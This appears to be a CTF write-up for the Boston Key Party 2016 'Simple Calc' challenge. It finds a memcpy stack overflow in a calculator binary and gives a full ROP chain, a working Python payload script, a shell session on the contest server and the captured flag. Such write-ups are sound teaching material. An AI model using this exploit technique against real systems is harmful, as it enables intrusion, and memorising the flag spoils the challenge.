---
layout: post
title: "Boston Key Party - Simple Calc (pwn 5 pts)"
date: 2016-03-07 01:00
categories: ctf exploit
---

Here is the first pwn challenge of the Boston Key Party CTF. Stay tuned for the
writeup of the Complex Calc challenge.

# Basic information

From the organizers:
{% highlight text %}
what a nice little calculator!
https://s3.amazonaws.com/bostonkeyparty/2016/b28b103ea5f1171553554f0127696a18c6d2dcf7
simplecalc.bostonkey.party 5400
{% endhighlight %}

This is an ELF 64-bit binary not stripped without much security
mechanism:
{% highlight shell-session %}
$ mv b28b103ea5f1171553554f0127696a18c6d2dcf7 simple_calc
$ file simple_calc
simple_calc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux),
statically linked, for GNU/Linux 2.6.24,
BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped

$ checksec --file simple_calc
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    No PIE          
RPATH      RUNPATH      FILE
No RPATH   No RUNPATH   simple_calc
{% endhighlight %}

With `NX` activated -- well is this 2016 after all -- we might have to create a ROP chain.

# Operation

Obviously the binary is a calculator. It starts by asking the number of
expected operations:
{% highlight shell-session %}
$ ./simple_calc 

	|#------------------------------------#|
	|         Something Calculator         |
	|#------------------------------------#|

Expected number of calculations: 
{% endhighlight %}

This is done by the following code. The user provided value for
the number of calculation is stored by `scanf` at `[rbp - local_14h]`:
{% highlight ca65 %}
| 0x004013d5      e899ffffff     call sym.print_motd
|                             ; function that print the banner
| 0x004013da      bfd0434900     mov edi, str.Expected_number_of_calculations:
|                             ; "Expected number of calculations: " @ 0x4943d0
| 0x004013df      b800000000     mov eax, 0
| 0x004013e4      e8a76f0000     call sym.__printf
| 0x004013e9      488d45ec       lea rax, qword [rbp - local_14h]
|                             ; location where the number is saved by scanf
| 0x004013ed      4889c6         mov rsi, rax
| 0x004013f0      bf14424900     mov edi, 0x494214           ; "%d" @ 0x494214
| 0x004013f5      b800000000     mov eax, 0
| 0x004013fa      e8c1700000     call sym.__isoc99_scanf
{% endhighlight %}

Afterward there is a check on that value. If the value is not between 4 and
255, the program exits while printing `Invalid number.`:
{% highlight ca65 %}
|      0x00401409      8b45ec         mov eax, dword [rbp - local_14h]
|      0x0040140c      3dff000000     cmp eax, 0xff
|  ,=< 0x00401411      7f08           jg 0x40141b                
|  |   0x00401413      8b45ec         mov eax, dword [rbp - local_14h]
|  |   0x00401416      83f803         cmp eax, 3
| ,==< 0x00401419      7f14           jg 0x40142f                
| ||   ; JMP XREF from 0x00401411 (sym.main)
| |`-> 0x0040141b      bff2434900     mov edi, str.Invalid_number.
                                ; "Invalid number." @ 0x4943f2
| |    0x00401420      e8bb790000     call sym.puts
| |    0x00401425      b800000000     mov eax, 0
| |,=< 0x0040142a      e959010000     jmp 0x401588               
| ||   ; JMP XREF from 0x00401419 (sym.main)
| `--> 0x0040142f      8b45ec         mov eax, dword [rbp - local_14h]
|  |   0x00401432      c1e002         shl eax, 2
                                ; 4 bytes / 32-bit values will be stored
|  |   0x00401435      4898           cdqe
|  |   0x00401437      4889c7         mov rdi, rax
|  |   0x0040143a      e8113c0100     call sym.malloc
|  |   0x0040143f      488945f0       mov qword [rbp - local_10h], rax
{% endhighlight %}

With a correct value, `malloc` is called to create a buffer to store the result
of the calculations. At `0x00401432` we can see that the value is multiplied by
4 before being given to `malloc` as the size argument. The buffer will be used
to store 4 bytes values.

Then the program presents the menu of possible operations which is done by the
function `print_menu`:
{% highlight shell-session %}
Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 
{% endhighlight %}

For the options 1 to 4, the program asks two numbers and prints the result of
the corresponding operation. The numbers must be strictly greater than 39,
otherwise the program refuses to perform the operation:
{% highlight shell-session %}
Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 40
Integer y: 40
Result for x + y is 80.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 39
Integer y: 39
Do you really need help calculating such small numbers?
Shame on you... Bye
{% endhighlight %}

# Searching for the vulnerability

The option number 5 `Save and Exit.` doesn't really save the results to disk
but it copies the content of the buffer allocated by `malloc` to the stack and
then exits:
{% highlight ca65 %}
| `----> 0x00401526      8b45e8         mov eax, dword [rbp - local_18h]
|        0x00401529      83f805         cmp eax, 5
| ,====< 0x0040152c      752f           jne 0x40155d               
| |      0x0040152e      8b45ec         mov eax, dword [rbp - local_14h]
| |      0x00401531      c1e002         shl eax, 2
| |      0x00401534      4863d0         movsxd rdx, eax
| |      0x00401537      488b4df0       mov rcx, qword [rbp - local_10h]
| |      0x0040153b      488d45c0       lea rax, qword [rbp - local_40h]
| |      0x0040153f      4889ce         mov rsi, rcx
| |      0x00401542      4889c7         mov rdi, rax
| |      0x00401545      e886130200     call sym.memcpy
| |      0x0040154e      4889c7         mov rdi, rax
| |      0x00401551      e87a410100     call sym.__cfree
| |      0x00401556      b800000000     mov eax, 0
| =====< 0x0040155b      eb2b           jmp 0x401588
|        [snip]
| -----> 0x00401588      c9             leave
\        0x00401589      c3             ret
{% endhighlight %}

The arguments of the call to `memcpy` are:

* `dest`: the address corresponding to `rbp - local_40h`, this is on the stack
* `src`: the address of the buffer created by `malloc` stored at `rbp - local_10h`
* `n`: the number of calculations (multiplied by 4 because the buffer contains dwords)

Here is the problem, `n` should be less or equal to the size of the destination
buffer, otherwise there is a buffer overflow and `memcpy` writes after the end of
the buffer.

Let's inspect the stack with `GDB` just before the call to `memcpy`:
{% highlight shell-session %}
$ gdb -q simple_calc
gdb-peda$ b *0x00401545
gdb-peda$ r
Starting program: simple_calc 

	|#------------------------------------#|
	|         Something Calculator         |
	|#------------------------------------#|

Expected number of calculations: 4
Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
[snip]
Breakpoint 1, 0x0000000000401545 in main ()
gdb-peda$ i frame
Stack level 0, frame at 0x7fffffffdcd0:
 rip = 0x401545 in main; saved rip = 0x40176c
 called by frame at 0x7fffffffdd90
 Arglist at 0x7fffffffdcc0, args: 
 Locals at 0x7fffffffdcc0, Previous frame's sp is 0x7fffffffdcd0
 Saved registers:
  rbp at 0x7fffffffdcc0, rip at 0x7fffffffdcc8
gdb-peda$ distance $rbp-0x40 0x7fffffffdcc8
From 0x7fffffffdc80 to 0x7fffffffdcc8: 72 bytes, 18 dwords
{% endhighlight %}

18 dwords or 72 bytes are seperating the beginning of the buffer and the saved
`rip` address. As the maximum number of calculations is 255, we have enough
room to inject whatever we want!

After the call to `memcpy`, there is a call to `free` on the `malloc`'ed buffer
before returning from the current function. We have to overwrite the address of
the buffer because it is placed on the stack between the buffer and saved `rip`.
This is not a problem because one of the first things that `free` does, is to
check if the pointer given to him is `NULL`. If this is the case, `free`
returns directly without performing any actions:
{% highlight c %}
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;
{% endhighlight %}
[source][libc_free]

# Exploitation

The layout of what we want to create looks something like this:
{% highlight text %}
+-------------------+
| 18 NULL dwords    |
+-------------------+
| ropchain          |
+-------------------+
{% endhighlight %}

The goal of the ROP chain is to call the `execve` syscall to run `/bin/sh` so
that we can get a shell. As shown in the man page, `execve` needs three
arguments:

* `const char *filename`: the command that must be executed, in our case a
  pointer to `/bin/sh`
* `char *const argv[]`: an array containing the arguments that is passed to the
  commend, useless here
* `char *const envp[]`: an array containing environment variables for the
  context in which the command has to be executed, useless here

In the binary there is no `/bin/sh`string (there is one in the C library but we
won't used that one here). We have to pass that string with the ROP chain. As
it will be on the stack, eventually the stack pointer `rsp` will point to it.

`execve`is the [syscall number 59][syscalls] and the [calling
convention][call_conv] tells us that the first argument must be passed in
`rdi`, the second in `rsi` and the third in `rdx`. Therefore before launching
the syscall, the registers must hold the following values:

* `RAX`: 59
* `RDI`: `RSP`
* `RSI`: 0
* `RDX`: 0

We need to find gadgets to:

* pop rax
* mov rdi, rsp
* pop rsi (there is no `xor rsi, rsi`)
* pop rdx (there is no `xor rdx, rdx`)
* syscall

[ROPgadget] is great tool to find gadgets:
{% highlight shell-session %}
$ ropgadget --file simple_calc > ropgadget.txt
$ grep ": pop rax" ropgadget.txt
[snip]
0x000000000044db34 : pop rax ; ret
[snip]
{% endhighlight %}

The gadget to `mov rdi, rsp` doesn't end with a return but with a call:
{% highlight text %}
0x0000000000492468 : mov rdi, rsp ; call r12
{% endhighlight %}

We need to store the address of the next gadget in `r12`. Fortunalely there is
a gadget to `pop r12`:
{% highlight text %}
0x0000000000400493 : pop r12 ; ret
{% endhighlight %}

Here is the overall ROP chain:
{% highlight text %}
0x000000000044db34 # pop rax ; ret
0x000000000000003b # 59
0x0000000000401c87 # pop rsi ; ret
0x0000000000000000 # 0
0x0000000000437a85 # pop rdx ; ret
0x0000000000000000 # 0
0x0000000000400493 # pop r12 ; ret
0x00000000004648e5 # syscall ; ret
0x0000000000492468 # mov rdi, rsp ; call r12
0x0068732f6e69622f # /bin/sh\0 (reversed)
{% endhighlight %}

The operations done by the calculator are done on 32-bit numbers, therefore each 64-bit value in the ROP chain is constructed with two operations. For example to write the first gadget:
{% highlight text %}
2256282 + 2256282 = 0x0044db34
          42 - 42 = 0x00000000
{% endhighlight %}

Why 42 - 42? Well, [why not][fortytwo]!

The full payload has to contains the following elements:

* The number of calculation
* 18 NULL dwords (e.g. 42 - 42 = 0)
* The ROP chain translated into operations to be done by the calculator
* The option 5 `Save and Exit.` to trigger the bufferoverflow

Here is the full script:
{% highlight python %}
#!/usr/bin/env python3

from time import sleep
from sys import stdout

payload = []

number = '39\n'
payload.append(number)

# add padding to reach saved rip
for i in range(0,18):
    payload.append('2\n42\n42\n')

# 0x44db34 : pop rax ; ret
payload.append('1\n2256282\n2256282\n') #ADD 2256282 2256282
payload.append('2\n42\n42\n')           # PADD
# 0x3b
payload.append('2\n101\n42\n')          #SUB 101 42
payload.append('2\n42\n42\n')           # PADD
# 0x401c87 : pop rsi ; ret
payload.append('1\n2100803\n2100804\n') #ADD 2100803 2100804
payload.append('2\n42\n42\n')           # PADD
# 0x0
payload.append('2\n42\n42\n')           #SUB 42 42
payload.append('2\n42\n42\n')           # PADD
# 0x437a85 : pop rdx ; ret
payload.append('1\n2211138\n2211139\n') #ADD 2211138 2211139
payload.append('2\n42\n42\n')           # PADD
# 0x0
payload.append('2\n42\n42\n')           #SUB 42 42
payload.append('2\n42\n42\n')           # PADD
# 0x400493 : pop r12 ; ret
payload.append('1\n2097737\n2097738\n') #ADD 2097737 2097738
payload.append('2\n42\n42\n')           # PADD
# 0x4648e5 : syscall ; ret
payload.append('1\n2303090\n2303091\n') #ADD 2303090 2303091
payload.append('2\n42\n42\n')           # PADD
# 0x492468 : mov rdi, rsp ; call r12
payload.append('1\n2396724\n2396724\n') #ADD 2396724 2396724
payload.append('2\n42\n42\n')           # PADD
# /bin/sh\0 => nib/ \0hs/
payload.append('1\n926200087\n926200088\n') #ADD
payload.append('1\n3422615\n3422616\n') #ADD

trigger = '5\n'
payload.append(trigger)

for cmd in payload:
    stdout.write(cmd)
    stdout.flush()
    sleep(0.1) # just to be nice
{% endhighlight %}

Let's run it:
{% highlight shell-session %}
$ (./payload.py; cat -) | nc simplecalc.bostonkey.party 5400

  |#------------------------------------#|
  |         Something Calculator         |
  |#------------------------------------#|

Expected number of calculations: Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> Integer x: Integer y: Result for x - y is 0.

[snip]

=> Integer x: Integer y: Result for x + y is 6845231.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
ls
key
run.sh
simpleCalc
simpleCalc_v2
socat_1.7.2.3-1_amd64.deb
cat key
BKPCTF{what_is_2015_minus_7547}
{% endhighlight %}

Please don't panic!

![Don't panic!](https://s-media-cache-ak0.pinimg.com/236x/45/a9/b2/45a9b2374b3fbba6780afe7b204af397.jpg)

[ropgadget]: https://github.com/JonathanSalwan/ROPgadget
[libc_free]: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=b8a43bfb32bcd97a6ed468cb7635b4bbfef2e3a2;hb=HEAD#l2925
[syscalls]: http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64
[call_conv]: https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI
[fortytwo]: https://en.wikipedia.org/wiki/The_answer_to_life_the_universe_and_everything#Answer_to_the_Ultimate_Question_of_Life.2C_the_Universe.2C_and_Everything_.2842.29
